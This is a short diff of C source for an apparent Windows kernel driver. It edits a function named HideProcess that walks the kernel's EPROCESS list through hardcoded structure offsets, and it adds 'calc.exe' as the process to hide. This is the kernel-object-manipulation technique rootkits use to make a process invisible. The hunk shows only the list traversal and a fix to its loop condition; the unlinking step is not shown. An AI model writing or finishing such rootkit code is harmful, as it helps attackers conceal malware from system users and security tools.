@@ -12,15 +12,18 @@ void HideProcess(){
 	int offset = 0x16c;
 	int offset_lEntry = 0x0b8;
 	char * name;
-	int i;
+	char * hide_proc = "calc.exe";
+	int guard;
+	int flag_first;
 	LIST_ENTRY * list_entry=NULL;
 	
 	pEProcFirst = IoGetCurrentProcess();
-	pEProc = IoGetCurrentProcess();
-	pEProcNext=NULL;
+	pEProc = NULL;
+	pEProcNext= pEProcFirst;
 	
-	i =0;
-	while(i<100 && pEProcFirst != pEProcNext){
+	guard =0;
+	flag_first = 0;
+	while(guard<100 && (pEProcFirst != pEProcNext || !flag_first) ){
 		pEProc = pEProcNext;
 	
 		name = (PUCHAR) pEProc + offset;
@@ -30,7 +33,8 @@ void HideProcess(){
 		list_entry= (LIST_ENTRY*)((PUCHAR) pEProc + offset_lEntry);
 	
 		pEProcNext = (PEPROCESS)((PUCHAR) list_entry->Flink - offset_lEntry);
-		i++;
+		guard++;
+		flag_first = 1;
 	}
 	
 }
